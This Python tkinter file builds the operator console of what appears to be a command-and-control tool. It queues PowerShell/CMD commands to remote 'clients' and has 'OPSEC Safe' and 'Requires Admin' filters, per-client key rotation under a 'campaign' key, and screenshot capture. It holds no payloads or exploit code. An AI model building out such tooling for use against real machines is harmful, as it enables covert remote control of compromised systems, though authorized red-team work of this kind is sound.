import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import datetime
import json
import os
import importlib.util
import logging
# To this (using relative import)
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from commands.command_loader import CommandLoader

logger = logging.getLogger(__name__)

class ClientInteractionUI:
    """Handles the UI components for interactive command execution with clients"""
    
    def __init__(self, parent_frame, client_id, client_manager, logger):
        """
        Initialize the client interaction UI
        
        Args:
            parent_frame: The parent frame widget
            client_id: The unique identifier for the client
            client_manager: The client manager instance
            logger: Function for logging events
        """
        self.parent_frame = parent_frame
        self.client_id = client_id
        self.client_manager = client_manager
        self.logger = logger
        self.command_history = []
        self.command_index = 0
        self.displayed_results = set()  # Track which commands have been displayed
        self.active_filters = {
            "opsec_safe": False,
            "requires_admin": False,
            "windows": True,
            "linux": False,
            "powershell": True,
            "cmd": True
        }
        
        # Initialize command loader
        self.command_loader = CommandLoader()
        
        self.create_widgets()
        
        # Register for command updates
        self.client_manager.register_command_update_callback(client_id, self.update_interaction_display)
        
        # Initial update to show any existing results
        self.update_interaction_display()
    
    def create_widgets(self):
        """Create the widgets for the interaction UI"""
        # Main container frame with better spacing
        self.main_frame = ttk.Frame(self.parent_frame)
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Create a paned window to allow resizing between console and history
        self.paned_window = ttk.PanedWindow(self.main_frame, orient=tk.VERTICAL)
        self.paned_window.pack(fill=tk.BOTH, expand=True)
        
        # Create a frame for the interactive console
        console_frame = ttk.LabelFrame(self.paned_window, text="Interactive Console")
        
        # Create a frame for command history
        history_frame = ttk.LabelFrame(self.paned_window, text="Command History")
        
        # Add both frames to the paned window with updated weights to give Command Categories more space
        self.paned_window.add(console_frame, weight=5)  # Console gets more space
        self.paned_window.add(history_frame, weight=2)  # History gets less space
        
        # Create output display with improved styling
        self.output_text = scrolledtext.ScrolledText(
            console_frame, 
            wrap=tk.WORD, 
            height=20, 
            background="#000000", 
            foreground="#FFFFFF",
            font=("Consolas", 10)
        )
        self.output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.output_text.config(state=tk.DISABLED)
        
        # Display welcome message
        self.append_output(f"--- Interactive session with client {self.client_id} ---\n", color="#00FF00")
        self.append_output("Type commands and press Enter to execute.\n")
        self.append_output("Use Up/Down arrow keys to navigate command history.\n\n")
        
        # Create input area with PS-like prompt
        input_frame = ttk.Frame(console_frame)
        input_frame.pack(fill=tk.X, padx=5, pady=(0, 5))
        
        # PS-like prompt label
        self.prompt_label = ttk.Label(input_frame, text="PS>", foreground="#0080FF", font=("Consolas", 10, "bold"))
        self.prompt_label.pack(side=tk.LEFT)
        
        # Command input entry with better styling
        self.command_entry = ttk.Entry(input_frame, width=80, font=("Consolas", 10))
        self.command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 0))
        self.command_entry.focus_set()
        
        # Bind events
        self.command_entry.bind("<Return>", self.submit_command)
        self.command_entry.bind("<Up>", self.previous_command)
        self.command_entry.bind("<Down>", self.next_command)
        
        # Status indicators frame
        status_frame = ttk.Frame(console_frame)
        status_frame.pack(fill=tk.X, padx=5, pady=(0, 5))
        
        # Connection indicator
        self.connection_status = ttk.Label(status_frame, text="Connection: Active", foreground="green", font=("Consolas", 9))
        self.connection_status.pack(side=tk.LEFT, padx=5)
        
        # Key rotation indicator
        self.key_status = ttk.Label(status_frame, text="Key: Default", foreground="orange", font=("Consolas", 9))
        self.key_status.pack(side=tk.LEFT, padx=5)
        self.update_key_status()
        
        # Refresh button
        refresh_button = ttk.Button(status_frame, text="Refresh Status", command=self.update_key_status)
        refresh_button.pack(side=tk.RIGHT, padx=5)
        
        # Command history in the history frame - tree view for better organization
        columns = ("Timestamp", "Type", "Command", "Status")
        self.history_tree = ttk.Treeview(history_frame, columns=columns, show="headings", height=6)  # Reduced height
        self.history_tree.heading("Timestamp", text="Timestamp")
        self.history_tree.heading("Type", text="Type")
        self.history_tree.heading("Command", text="Command")
        self.history_tree.heading("Status", text="Status")
        
        # Configure column widths
        self.history_tree.column("Timestamp", width=140)
        self.history_tree.column("Type", width=80)
        self.history_tree.column("Command", width=240)
        self.history_tree.column("Status", width=80)
        
        # Add scrollbar for history tree
        history_scroll = ttk.Scrollbar(history_frame, orient="vertical", command=self.history_tree.yview)
        self.history_tree.configure(yscrollcommand=history_scroll.set)
        
        # Pack the tree and scrollbar
        self.history_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        history_scroll.pack(side=tk.RIGHT, fill=tk.Y, pady=5)
        
        # Bind selection event to view result
        self.history_tree.bind("<ButtonRelease-1>", self.on_history_select)
        
        # Create commands notebook with subtabs
        self.create_command_subtabs()
    
    def create_command_subtabs(self):
        """Create subtabs for categorized commands with filtering"""
        # Create notebook and container
        commands_frame = ttk.LabelFrame(self.main_frame, text="Command Categories")
        commands_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Add filters at the top of the commands frame
        filter_frame = ttk.Frame(commands_frame)
        filter_frame.pack(fill=tk.X, padx=5, pady=(5, 0))
        
        # Create filter checkboxes
        filter_title = ttk.Label(filter_frame, text="Filters:", font=("Arial", 9, "bold"))
        filter_title.pack(side=tk.LEFT, padx=(0, 5))
        
        # OPSEC Safe filter
        self.opsec_filter_var = tk.BooleanVar(value=self.active_filters["opsec_safe"])
        opsec_check = ttk.Checkbutton(filter_frame, text="OPSEC Safe", 
                                    variable=self.opsec_filter_var, 
                                    command=lambda: self.toggle_filter("opsec_safe"))
        opsec_check.pack(side=tk.LEFT, padx=5)
        
        # Requires Admin filter
        self.admin_filter_var = tk.BooleanVar(value=self.active_filters["requires_admin"])
        admin_check = ttk.Checkbutton(filter_frame, text="Requires Admin", 
                                    variable=self.admin_filter_var,
                                    command=lambda: self.toggle_filter("requires_admin"))
        admin_check.pack(side=tk.LEFT, padx=5)
        
        # Target OS filters
        os_frame = ttk.Frame(filter_frame)
        os_frame.pack(side=tk.LEFT, padx=5)
        
        os_label = ttk.Label(os_frame, text="OS:")
        os_label.pack(side=tk.LEFT)
        
        self.windows_filter_var = tk.BooleanVar(value=self.active_filters["windows"])
        windows_check = ttk.Checkbutton(os_frame, text="Windows", 
                                    variable=self.windows_filter_var,
                                    command=lambda: self.toggle_filter("windows"))
        windows_check.pack(side=tk.LEFT)
        
        self.linux_filter_var = tk.BooleanVar(value=self.active_filters["linux"])
        linux_check = ttk.Checkbutton(os_frame, text="Linux", 
                                    variable=self.linux_filter_var,
                                    command=lambda: self.toggle_filter("linux"))
        linux_check.pack(side=tk.LEFT)
        
        # Command type filters
        type_frame = ttk.Frame(filter_frame)
        type_frame.pack(side=tk.LEFT, padx=5)
        
        type_label = ttk.Label(type_frame, text="Type:")
        type_label.pack(side=tk.LEFT)
        
        self.ps_filter_var = tk.BooleanVar(value=self.active_filters["powershell"])
        ps_check = ttk.Checkbutton(type_frame, text="PowerShell", 
                                variable=self.ps_filter_var,
                                command=lambda: self.toggle_filter("powershell"))
        ps_check.pack(side=tk.LEFT)
        
        self.cmd_filter_var = tk.BooleanVar(value=self.active_filters["cmd"])
        cmd_check = ttk.Checkbutton(type_frame, text="CMD", 
                                variable=self.cmd_filter_var,
                                command=lambda: self.toggle_filter("cmd"))
        cmd_check.pack(side=tk.LEFT)
        
        # Clear filters button
        clear_filters = ttk.Button(filter_frame, text="Clear Filters", command=self.clear_filters)
        clear_filters.pack(side=tk.RIGHT, padx=5)
        
        # Create notebook for command categories
        self.commands_notebook = ttk.Notebook(commands_frame)
        self.commands_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Load categories from command loader
        categories = self.command_loader.get_categories()
        
        # Create a tab for each category
        for category in categories:
            tab_frame = ttk.Frame(self.commands_notebook)
            self.commands_notebook.add(tab_frame, text=category.capitalize())
            
            # Get commands for this category
            commands = self.command_loader.get_commands(category)
            
            # Skip empty categories
            if not commands:
                empty_label = ttk.Label(tab_frame, text=f"No commands found in '{category}' category")
                empty_label.pack(padx=10, pady=10)
                continue
                
            # Create scrollable frame for commands
            scroll_canvas = tk.Canvas(tab_frame)
            scrollbar = ttk.Scrollbar(tab_frame, orient="vertical", command=scroll_canvas.yview)
            scroll_frame = ttk.Frame(scroll_canvas)
            
            scroll_frame.bind("<Configure>", 
                lambda e, canvas=scroll_canvas: canvas.configure(scrollregion=canvas.bbox("all")))
            
            scroll_canvas.create_window((0, 0), window=scroll_frame, anchor="nw")
            scroll_canvas.configure(yscrollcommand=scrollbar.set)
            
            scroll_canvas.pack(side="left", fill="both", expand=True)
            scrollbar.pack(side="right", fill="y")
            
            # Create button grid - normal sized buttons
            row = 0
            col = 0
            max_cols = 4  # Back to 4 columns
            
            # Add command metadata and tags
            command_metadata = self.load_command_metadata()
            
            for cmd_name, cmd_info in commands.items():
                # Get additional metadata and tags for this command if available
                metadata = command_metadata.get(cmd_name, {})
                tags = metadata.get("tags", {})
                
                # Skip commands that don't match current filters
                if not self.command_matches_filters(tags):
                    continue
                
                # Command execution function
                def make_command_func(cat=category, cmd=cmd_name):
                    return lambda: self.command_loader.execute_command(cat, cmd, self, self.client_id)
                
                # Create button with normal dimensions - just like original
                display_name = cmd_name.replace('_', ' ').title()
                
                cmd_button = ttk.Button(
                    scroll_frame,
                    text=display_name,
                    width=15,
                    command=make_command_func()
                )
                
                # Add tooltip with description if available
                if cmd_info['description']:
                    self.create_tooltip(cmd_button, cmd_info['description'])
                
                # Position the button in the grid
                cmd_button.grid(row=row, column=col, padx=5, pady=5, sticky="nsew")
                
                # Update grid position
                col += 1
                if col >= max_cols:
                    col = 0
                    row += 1
            
            # Configure grid weights
            for i in range(max_cols):
                scroll_frame.columnconfigure(i, weight=1)
    
    def load_command_metadata(self):
        """Load command metadata including tags"""
        metadata = {}
        
        # Load tags from loaded commands
        for category in self.command_loader.get_categories():
            commands = self.command_loader.get_commands(category)
            for cmd_name, cmd_info in commands.items():
                metadata[cmd_name] = {
                    "tags": cmd_info.get('tags', {})
                }
        
        # Fall back to hard-coded metadata if no tags were loaded
        if not any(metadata.get(cmd, {}).get('tags', {}) for cmd in metadata):
            # Basic fallback metadata for common commands
            default_metadata = {
                "whoami": {
                    "tags": {
                        "opsec_safe": True,
                        "requires_admin": False,
                        "windows": True,
                        "linux": True,
                        "powershell": False,
                        "cmd": True
                    }
                },
                "whoami_ps": {
                    "tags": {
                        "opsec_safe": True,
                        "requires_admin": False,
                        "windows": True,
                        "linux": False,
                        "powershell": True,
                        "cmd": False
                    }
                }
            }
            
            # Add default metadata
            for cmd_name, cmd_meta in default_metadata.items():
                metadata[cmd_name] = cmd_meta
        
        return metadata
    
    def command_matches_filters(self, tags):
        """Check if command matches current filters"""
        # If no filters are active, show all commands
        if not any(self.active_filters.values()):
            return True
        
        # Check OPSEC filter
        if self.active_filters["opsec_safe"] and not tags.get("opsec_safe", False):
            return False
            
        # Check Admin filter
        if self.active_filters["requires_admin"] and not tags.get("requires_admin", False):
            return False
        
        # Check OS filters
        os_filters_active = self.active_filters["windows"] or self.active_filters["linux"]
        if os_filters_active:
            matches_os = False
            if self.active_filters["windows"] and tags.get("windows", True):
                matches_os = True
            if self.active_filters["linux"] and tags.get("linux", False):
                matches_os = True
            if not matches_os:
                return False
        
        # Check command type filters
        type_filters_active = self.active_filters["powershell"] or self.active_filters["cmd"]
        if type_filters_active:
            matches_type = False
            if self.active_filters["powershell"] and tags.get("powershell", True):
                matches_type = True
            if self.active_filters["cmd"] and tags.get("cmd", False):
                matches_type = True
            if not matches_type:
                return False
        
        return True
    
    def toggle_filter(self, filter_name):
        """Toggle a filter and refresh the command display"""
        if filter_name == "opsec_safe":
            self.active_filters["opsec_safe"] = self.opsec_filter_var.get()
        elif filter_name == "requires_admin":
            self.active_filters["requires_admin"] = self.admin_filter_var.get()
        elif filter_name == "windows":
            self.active_filters["windows"] = self.windows_filter_var.get()
        elif filter_name == "linux":
            self.active_filters["linux"] = self.linux_filter_var.get()
        elif filter_name == "powershell":
            self.active_filters["powershell"] = self.ps_filter_var.get()
        elif filter_name == "cmd":
            self.active_filters["cmd"] = self.cmd_filter_var.get()
        
        # Recreate the command tabs with new filters
        self.refresh_command_tabs()
    
    def clear_filters(self):
        """Clear all filters and refresh command display"""
        self.active_filters = {
            "opsec_safe": False,
            "requires_admin": False,
            "windows": True,
            "linux": False,
            "powershell": True,
            "cmd": True
        }
        
        # Update the UI checkboxes
        self.opsec_filter_var.set(False)
        self.admin_filter_var.set(False)
        self.windows_filter_var.set(True)
        self.linux_filter_var.set(False)
        self.ps_filter_var.set(True)
        self.cmd_filter_var.set(True)
        
        # Refresh the command tabs
        self.refresh_command_tabs()
    
    def refresh_command_tabs(self):
        """Refresh command tabs based on current filters"""
        # Remember current selected tab
        selected_tab = self.commands_notebook.select()
        selected_index = self.commands_notebook.index(selected_tab) if selected_tab else 0
        
        # Remove existing tabs
        for tab in self.commands_notebook.tabs():
            self.commands_notebook.forget(tab)
        
        # Reload categories
        categories = self.command_loader.get_categories()
        
        # Recreate tabs for each category
        for category in categories:
            tab_frame = ttk.Frame(self.commands_notebook)
            self.commands_notebook.add(tab_frame, text=category.capitalize())
            
            # Get commands for this category
            commands = self.command_loader.get_commands(category)
            
            # Skip empty categories
            if not commands:
                empty_label = ttk.Label(tab_frame, text=f"No commands found in '{category}' category")
                empty_label.pack(padx=10, pady=10)
                continue
                
            # Create scrollable frame for commands
            scroll_canvas = tk.Canvas(tab_frame)
            scrollbar = ttk.Scrollbar(tab_frame, orient="vertical", command=scroll_canvas.yview)
            scroll_frame = ttk.Frame(scroll_canvas)
            
            scroll_frame.bind("<Configure>", 
                lambda e, canvas=scroll_canvas: canvas.configure(scrollregion=canvas.bbox("all")))
            
            scroll_canvas.create_window((0, 0), window=scroll_frame, anchor="nw")
            scroll_canvas.configure(yscrollcommand=scrollbar.set)
            
            scroll_canvas.pack(side="left", fill="both", expand=True)
            scrollbar.pack(side="right", fill="y")
            
            # Create button grid
            row = 0
            col = 0
            max_cols = 4
            
            # Load command metadata and tags
            command_metadata = self.load_command_metadata()
            
            # Count visible commands after filtering
            visible_commands = 0
            
            for cmd_name, cmd_info in commands.items():
                # Get tags for this command
                metadata = command_metadata.get(cmd_name, {})
                tags = metadata.get("tags", {})
                
                # Skip commands that don't match current filters
                if not self.command_matches_filters(tags):
                    continue
                
                visible_commands += 1
                
                # Command execution function
                def make_command_func(cat=category, cmd=cmd_name):
                    return lambda: self.command_loader.execute_command(cat, cmd, self, self.client_id)
                
                # Normal sized button with regular dimensions
                display_name = cmd_name.replace('_', ' ').title()
                cmd_button = ttk.Button(
                    scroll_frame,
                    text=display_name,
                    width=15,
                    command=make_command_func()
                )
                
                # Add tooltip with description if available
                if cmd_info['description']:
                    self.create_tooltip(cmd_button, cmd_info['description'])
                
                # Position the button in the grid
                cmd_button.grid(row=row, column=col, padx=5, pady=5, sticky="nsew")
                
                # Update grid position
                col += 1
                if col >= max_cols:
                    col = 0
                    row += 1
            
            # Display message if no commands match filters
            if visible_commands == 0:
                no_match_label = ttk.Label(tab_frame, text="No commands match the current filters")
                no_match_label.pack(padx=10, pady=10)
            
            # Configure grid weights
            for i in range(max_cols):
                scroll_frame.columnconfigure(i, weight=1)
        
        # Try to select the same tab index
        if self.commands_notebook.tabs():
            if selected_index < len(self.commands_notebook.tabs()):
                self.commands_notebook.select(selected_index)
            else:
                self.commands_notebook.select(0)
    
    def create_tooltip(self, widget, text):
        """Create a simple tooltip for a widget"""
        def enter(event):
            x, y, _, _ = widget.bbox("insert")
            x += widget.winfo_rootx() + 25
            y += widget.winfo_rooty() + 20
            
            # Create a toplevel window
            self.tooltip = tk.Toplevel(widget)
            self.tooltip.wm_overrideredirect(True)
            self.tooltip.wm_geometry(f"+{x}+{y}")
            
            label = ttk.Label(self.tooltip, text=text, wraplength=250,
                              background="#ffffe0", relief="solid", borderwidth=1,
                              font=("tahoma", "8", "normal"))
            label.pack(ipadx=3, ipady=2)
            
        def leave(event):
            if hasattr(self, "tooltip"):
                self.tooltip.destroy()
                
        widget.bind("<Enter>", enter)
        widget.bind("<Leave>", leave)
    
    def update_key_status(self):
        """Update the key status indicator based on client manager info"""
        has_unique_key = False
        client_id = self.client_id
        
        # Check if client has a unique key using multiple methods
        if hasattr(self.client_manager, 'has_unique_key'):
            has_unique_key = self.client_manager.has_unique_key(client_id)
        elif hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys:
            has_unique_key = True
        else:
            # Check if key_rotation_time exists in client info
            client_info = self.client_manager.get_clients_info().get(client_id, {})
            if 'key_rotation_time' in client_info:
                has_unique_key = True
        
        if has_unique_key:
            self.key_status.config(text="Key: Client-Specific", foreground="green")
        else:
            self.key_status.config(text="Key: Default", foreground="orange")
    
    def clear_pending_commands(self):
        """Clear all pending commands for this client"""
        if self.client_id:
            self.client_manager.clear_pending_commands(self.client_id)
            self.append_output("All pending commands cleared.\n", color="#FFCC00")
            # Update the display
            self.update_interaction_display()
    
    def reconnect_client(self):
        """Force a client reconnection by requesting reregistration"""
        if self.client_id:
            self.send_command("echo 'Reconnection requested'", command_type="reconnect")
            self.append_output("Reconnection request sent to client.\n", color="#FFCC00")
            self.connection_status.config(text="Connection: Reconnecting...", foreground="orange")
            # Schedule a status update after a short delay
            self.parent_frame.after(5000, self.update_key_status)
            self.parent_frame.after(5000, lambda: self.connection_status.config(text="Connection: Active", foreground="green"))
    
    def submit_command(self, event=None):
        """Submit the command when Enter is pressed"""
        command = self.command_entry.get().strip()
        if not command:
            return "break"
        
        # Add to history
        if not self.command_history or self.command_history[-1] != command:
            self.command_history.append(command)
        self.command_index = len(self.command_history)
        
        # Display command
        self.append_output(f"PS> {command}\n", color="#00FFFF")
        self.append_output("Command sent. Waiting for client response...\n", color="#FFCC00")
        
        # Send command
        self.send_command(command)
        
        # Clear entry
        self.command_entry.delete(0, tk.END)
        
        return "break"  # Prevent default behavior
    
    def send_command(self, command, command_type="execute"):
        """Send a command to the client"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Add command to client manager
        self.client_manager.add_command(self.client_id, command_type, command)
        
        # Log it
        self.logger(f"Command {command_type} '{command}' sent to client {self.client_id}")
        
        # Update the history tree - status will start as "Pending"
        self.update_history_tree()

    def previous_command(self, event=None):
        """Navigate to previous command in history"""
        if not self.command_history:
            return "break"
        
        if self.command_index > 0:
            self.command_index -= 1
            self.command_entry.delete(0, tk.END)
            self.command_entry.insert(0, self.command_history[self.command_index])
        
        return "break"  # Prevent default behavior
    
    def next_command(self, event=None):
        """Navigate to next command in history"""
        if not self.command_history:
            return "break"
        
        if self.command_index < len(self.command_history) - 1:
            self.command_index += 1
            self.command_entry.delete(0, tk.END)
            self.command_entry.insert(0, self.command_history[self.command_index])
        elif self.command_index == len(self.command_history) - 1:
            # At the end of history, clear the entry
            self.command_index = len(self.command_history)
            self.command_entry.delete(0, tk.END)
        
        return "break"  # Prevent default behavior
    
    def append_output(self, text, color=None):
        """Append text to the output display with optional color"""
        self.output_text.config(state=tk.NORMAL)
        
        if color:
            # Remember current tags
            current_tags = self.output_text.tag_names()
            
            # Create a new tag with the specified color if it doesn't exist
            tag_name = f"color_{color.replace('#', '')}"
            if tag_name not in current_tags:
                self.output_text.tag_configure(tag_name, foreground=color)
            
            # Insert with tag
            self.output_text.insert(tk.END, text, tag_name)
        else:
            # Insert without tag
            self.output_text.insert(tk.END, text)
        
        self.output_text.see(tk.END)  # Scroll to the end
        self.output_text.config(state=tk.DISABLED)
    
    def update_history_tree(self):
        """Update the command history tree with current client history"""
        # Clear existing items
        for item in self.history_tree.get_children():
            self.history_tree.delete(item)
        
        # Get client history
        history = self.client_manager.get_client_history(self.client_id)
        
        # Add items to tree
        existing_timestamps = set()  # Track which timestamps we've already added
        
        for command in history:
            timestamp = command.get('timestamp', '')
            
            # Skip this command if we've already added one with the same timestamp
            if timestamp in existing_timestamps:
                continue
                
            command_type = command.get('command_type', '')
            args = command.get('args', '')
            
            # Determine status
            if 'result' in command:
                status = "Completed"
            else:
                status = "Pending"
            
            # Insert into tree - use timestamp as ID for easy lookup
            try:
                self.history_tree.insert("", tk.END, iid=timestamp, values=(timestamp, command_type, args, status),
                                    tags=(status.lower(),))
                existing_timestamps.add(timestamp)
            except tk.TclError as e:
                # If the item already exists, just continue
                if "already exists" in str(e):
                    existing_timestamps.add(timestamp)
                    continue
                else:
                    # Re-raise other Tcl errors
                    raise
        
        # Configure tag colors
        self.history_tree.tag_configure("completed", background="#E0FFE0")  # Light green
        self.history_tree.tag_configure("pending", background="#FFFFD0")    # Light yellow
    
    def on_history_select(self, event):
        """Handle selection in the history tree to show command result"""
        # Get selected item
        selected = self.history_tree.selection()
        if not selected:
            return
        
        # The ID is the timestamp
        timestamp = selected[0]
        
        # Find the command in history
        history = self.client_manager.get_client_history(self.client_id)
        for command in history:
            if command.get('timestamp') == timestamp:
                # Format command details
                cmd_type = command.get('command_type', 'unknown')
                args = command.get('args', '')
                
                # Show command and result in output area
                self.append_output(f"\n--- Command Details ---\n", color="#FFCC00")
                self.append_output(f"Timestamp: {timestamp}\n", color="#FFFFFF")
                self.append_output(f"Type: {cmd_type}\n", color="#FFFFFF")
                self.append_output(f"Command: {args}\n", color="#FFFFFF")
                
                if 'result' in command:
                    result = command.get('result', '')
                    self.append_output(f"\n--- Result ---\n", color="#00FF00")
                    self.append_output(f"{result}\n", color="#FFFFFF")
                else:
                    self.append_output(f"\n--- Result ---\n", color="#FFCC00")
                    self.append_output("Pending or no result available\n", color="#FFCC00")
                
                self.append_output("-------------------\n", color="#FFCC00")
                break
    
    def update_interaction_display(self):
        """Update the interaction display with new command results"""
        try:
            # Update the history tree first
            self.update_history_tree()
            
            # Also update key status indicator
            self.update_key_status()
            
            # Get client history
            history = self.client_manager.get_client_history(self.client_id)
            if not history:
                self.logger(f"No command history found for client {self.client_id}")
                return
            
            # Track command IDs (timestamps) that have new results to display
            new_results = []
            
            # Check each command for new results
            for command in history:
                timestamp = command.get('timestamp', '')
                command_id = timestamp  # Use timestamp as unique identifier
                
                # Check if command has a result and hasn't been displayed yet
                if 'result' in command and command_id not in self.displayed_results:
                    new_results.append(command)
                    
                    # Add command ID to displayed results set
                    self.displayed_results.add(command_id)
            
            # Sort new results by timestamp to display in order
            new_results.sort(key=lambda cmd: cmd.get('timestamp', ''))
            
            # Display new results
            for command in new_results:
                self.display_command_result(command)
        except Exception as e:
            self.logger(f"Error updating interaction display: {e}")
    
    def display_command_result(self, command):
        """Display a single command result in the output console"""
        try:
            timestamp = command.get('timestamp', '')
            command_type = command.get('command_type', 'unknown')
            args = command.get('args', '')
            result = command.get('result', 'No result available')
            
            # Format the output with timestamp
            formatted_time = timestamp.split()[1] if ' ' in timestamp else timestamp  # Just show time part
            self.append_output(f"\n[{formatted_time}] Command result ({command_type}):\n", color="#00FF00")
            self.append_output("-" * 50 + "\n", color="#808080")
            
            # Handle different result formats and command types
            if command_type == "key_rotation":
                # Special formatting for key rotation results
                self.append_output("Key rotation command processed\n", color="#FFCC00")
                if isinstance(result, dict):
                    for key, value in result.items():
                        self.append_output(f"{key}: {value}\n")
                else:
                    self.append_output(str(result) + "\n")
                self.append_output("Note: Communication is now using a client-specific key\n", color="#00FF00")
                
            elif command_type == "key_status":
                # Special formatting for key status results
                if "key" in str(result).lower():
                    self.append_output(result + "\n")
                else:
                    client_info = self.client_manager.get_clients_info().get(self.client_id, {})
                    has_key = hasattr(self.client_manager, 'has_unique_key') and self.client_manager.has_unique_key(self.client_id)
                    self.append_output(f"Using {'client-specific' if has_key else 'campaign default'} key\n", color="#FFCC00")
                    self.append_output(result + "\n")
                    
            elif command_type == "system_info":
                # Format system info nicely
                if isinstance(result, dict):
                    for key, value in result.items():
                        self.append_output(f"{key}: {value}\n")
                else:
                    # Try to parse JSON string
                    try:
                        parsed_info = json.loads(result)
                        for key, value in parsed_info.items():
                            self.append_output(f"{key}: {value}\n")
                    except (json.JSONDecodeError, TypeError):
                        self.append_output(result + "\n")
                        
            elif command_type == "screenshot":
                # Show special message for screenshots
                self.append_output("Screenshot captured and saved on server\n", color="#00FFFF")
                self.append_output(result + "\n")
                
            else:
                # Regular command result
                self.append_output(result + "\n")
                
            self.append_output("-" * 50 + "\n", color="#808080")
            
            # Mark as handled in the class
            command_id = timestamp
            self.displayed_results.add(command_id)
        except Exception as e:
            self.logger(f"Error displaying command result: {e}")